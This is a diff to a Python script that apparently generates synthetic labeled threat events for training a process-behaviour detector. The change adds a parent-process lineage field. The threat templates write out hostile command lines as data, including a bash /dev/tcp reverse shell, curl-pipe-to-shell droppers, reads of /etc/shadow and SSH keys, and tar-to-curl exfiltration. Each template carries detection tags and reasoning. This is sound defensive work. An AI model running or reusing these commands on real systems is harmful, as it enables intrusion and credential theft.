@@ -36,8 +36,10 @@ TS_MIN = 1749000000
 TS_MAX = 1781300000
 
 
-def behavior_suffix(conns=None, files=None, kids=None):
+def behavior_suffix(conns=None, files=None, kids=None, lineage=None):
     parts = ""
+    if lineage:
+        parts += " parent_lineage:[" + "\u2192".join(lineage) + "]"
     if conns:
         parts += f" outbound_connections:[{','.join(sorted(conns))}]"
     if files:
@@ -49,9 +51,9 @@ def behavior_suffix(conns=None, files=None, kids=None):
     return parts
 
 
-def format_guard_event(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None):
+def format_guard_event(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None, lineage=None):
     base = f"{name} PID:{pid} uid:{uid} exe:{exe} cmd:{cmd} time:{ts}"
-    return base + behavior_suffix(conns, files, kids)
+    return base + behavior_suffix(conns, files, kids, lineage)
 
 
 # ---------------------------------------------------------------------------
@@ -100,15 +102,28 @@ def _files(lo=1, hi=2):
     return lambda: random.sample(SENSITIVE, k=random.randint(lo, hi))
 
 
+# Malicious lineage pools (r7 lineage-aware threats)
+MALICIOUS_LINEAGE = [
+    ["nginx", "sh"],
+    ["nginx", "bash", "sh"],
+    ["systemd", "containerd-shim", "bash"],
+    ["containerd-shim", "bash", "curl"],
+    ["sshd", "bash", "sh"],
+    ["systemd", "sh", "curl"],
+    ["cron", "bash"],
+    ["apache2", "sh"],
+]
+def _mal_lin(): return random.choice(MALICIOUS_LINEAGE)
+
 TEMPLATES = [
     # --- Reverse shell / C2 -------------------------------------------------
-    dict(category="reverse_shell", name=lambda: random.choice(HIDDEN_NAMES),
+    dict(lineage=_mal_lin, category="reverse_shell", name=lambda: random.choice(HIDDEN_NAMES),
          exe=evil_exe, uid=[1000, 0],
          cmds=["-e /bin/bash {ip} {port}", "-i", "bash -i >& /dev/tcp/{ip}/{port} 0>&1"],
          conns=_conns(C2_PORTS, 1, 1), kids=lambda: random.sample(["bash", "sh"], k=1),
          mitre=["T1059.004", "T1071"], tags=["reverse_shell", "outbound_c2", "shell_child"],
          reasoning="Process in a temp dir opening an interactive shell back to a non-local IP — classic reverse shell."),
-    dict(category="c2_beacon", name=lambda: random.choice([".sysupdate", "systemd-resolv"]),
+    dict(lineage=_mal_lin, category="c2_beacon", name=lambda: random.choice([".sysupdate", "systemd-resolv"]),
          exe=evil_exe, uid=[1000],
          cmds=["--beacon {ip}:{port}", "-c {ip}", ""],
          conns=_conns(C2_PORTS, 1, 3),
@@ -116,7 +131,7 @@ TEMPLATES = [
          reasoning="Hidden-named binary beaconing on a regular interval to a suspicious host — C2 implant."),
 
     # --- Dropper / staging --------------------------------------------------
-    dict(category="dropper", name=lambda: random.choice(["curl", "wget", "sh"]),
+    dict(lineage=_mal_lin, category="dropper", name=lambda: random.choice(["curl", "wget", "sh"]),
          exe=lambda: random.choice(["/usr/bin/curl", "/usr/bin/wget", "/bin/sh"]), uid=[1000],
          cmds=["-fsSL http://{ip}:{port}/x.sh", "http://{ip}/payload -O /tmp/.x", "-c 'curl {ip}|sh'"],
          conns=_conns([80, 8080, 443], 1, 1),
@@ -126,7 +141,7 @@ TEMPLATES = [
          reasoning="Download-and-execute: fetches a remote payload to /tmp and pipes it to a shell."),
 
     # --- Miner --------------------------------------------------------------
-    dict(category="cryptominer", name=lambda: random.choice([".kworker", "kworkerd", ".xmr"]),
+    dict(lineage=_mal_lin, category="cryptominer", name=lambda: random.choice([".kworker", "kworkerd", ".xmr"]),
          exe=evil_exe, uid=[1000, 0],
          cmds=["--algo rx/0 -o {ip}:{port} -u worker", "-o stratum+tcp://{ip}:{port}", "--cpu-priority 5"],
          conns=_conns(POOL_PORTS, 1, 1),
@@ -134,7 +149,7 @@ TEMPLATES = [
          reasoning="Hidden process connecting to a mining-pool port with mining flags — cryptojacking."),
 
     # --- Credential theft ---------------------------------------------------
-    dict(category="credential_theft", name=lambda: random.choice(["cat", "cp", ".x", "python3"]),
+    dict(lineage=_mal_lin, category="credential_theft", name=lambda: random.choice(["cat", "cp", ".x", "python3"]),
          exe=evil_exe, uid=[0, 1000],
          cmds=["/etc/shadow", "-r ~/.ssh/", "-c 'open(\"/etc/shadow\").read()'"],
          files=_files(2, 3),
@@ -143,7 +158,7 @@ TEMPLATES = [
          reasoning="Reads multiple credential stores (shadow, SSH keys) and may exfiltrate — credential theft."),
 
     # --- Persistence --------------------------------------------------------
-    dict(category="persistence", name=lambda: random.choice(["sh", "bash", "tee", "crontab"]),
+    dict(lineage=_mal_lin, category="persistence", name=lambda: random.choice(["sh", "bash", "tee", "crontab"]),
          exe=lambda: random.choice(["/bin/sh", "/bin/bash", "/usr/bin/crontab"]), uid=[0, 1000],
          cmds=["-c 'echo ... >> /etc/cron.d/x'", "-e", "install /etc/systemd/system/x.service"],
          files=lambda: random.sample(
@@ -154,7 +169,7 @@ TEMPLATES = [
          reasoning="Writes a cron job / systemd unit / autostart entry to survive reboot — persistence."),
 
     # --- Privilege escalation ----------------------------------------------
-    dict(category="privilege_escalation", name=lambda: random.choice(["pkexec", "sudo", ".x", "sh"]),
+    dict(lineage=_mal_lin, category="privilege_escalation", name=lambda: random.choice(["pkexec", "sudo", ".x", "sh"]),
          exe=lambda: random.choice(["/usr/bin/pkexec", evil_exe()]), uid=[1000],
          cmds=["", "-u#-1 id", "/bin/sh -p"],
          files=lambda: ["/etc/sudoers", "/etc/shadow"][: random.randint(1, 2)] if random.random() < 0.6 else None,
@@ -163,7 +178,7 @@ TEMPLATES = [
          reasoning="Abuses a SUID/sudo path to spawn a privileged shell from an unprivileged uid — priv-esc."),
 
     # --- Fileless / memfd ---------------------------------------------------
-    dict(category="fileless", name=lambda: random.choice([".", "bash", "python3"]),
+    dict(lineage=_mal_lin, category="fileless", name=lambda: random.choice([".", "bash", "python3"]),
          exe=lambda: random.choice(["memfd:x (deleted)", "/tmp/.x (deleted)", "/proc/self/exe (deleted)"]),
          uid=[1000, 0], cmds=["", "-c '...'"],
          conns=lambda: [evil_conn(C2_PORTS)] if random.random() < 0.6 else None,
@@ -171,7 +186,7 @@ TEMPLATES = [
          reasoning="Executing from an in-memory/deleted image with no on-disk binary — fileless execution."),
 
     # --- Injection ----------------------------------------------------------
-    dict(category="injection", name=lambda: random.choice([".x", "gdb", "python3"]),
+    dict(lineage=_mal_lin, category="injection", name=lambda: random.choice([".x", "gdb", "python3"]),
          exe=evil_exe, uid=[1000, 0],
          cmds=["-p {pid} --ptrace", "-c 'ctypes.CDLL(...)'", "inject /tmp/.so"],
          kids=lambda: ["sh"] if random.random() < 0.4 else None,
@@ -180,7 +195,7 @@ TEMPLATES = [
          reasoning="Uses ptrace/dlopen from a temp path to inject into another process — process injection."),
 
     # --- Exfiltration -------------------------------------------------------
-    dict(category="exfiltration", name=lambda: random.choice(["tar", "curl", "python3", ".x"]),
+    dict(lineage=_mal_lin, category="exfiltration", name=lambda: random.choice(["tar", "curl", "python3", ".x"]),
          exe=lambda: random.choice(["/usr/bin/tar", "/usr/bin/curl", evil_exe()]), uid=[1000, 0],
          cmds=["czf - /home/cosmic/Documents | curl -T - {ip}", "--data-binary @/tmp/.dump {ip}"],
          files=_files(1, 2),
@@ -213,9 +228,10 @@ def make_record(t):
     ip = (conns[0].rsplit(":", 1)[0] if conns else random.choice(EVIL_IPS))
     port = (conns[0].rsplit(":", 1)[1] if conns else str(random.choice(C2_PORTS)))
     cmd = cmd.replace("{ip}", ip).replace("{port}", port).replace("{pid}", str(rand_pid()))
+    lineage = resolve(t.get("lineage")) if "lineage" in t else None
 
     inp = format_guard_event(name, rand_pid(), uid, exe, cmd, ts,
-                             conns=conns, files=files, kids=kids)
+                             conns=conns, files=files, kids=kids, lineage=lineage)
     return {
         "bucket": "threat",
         "category": t["category"],
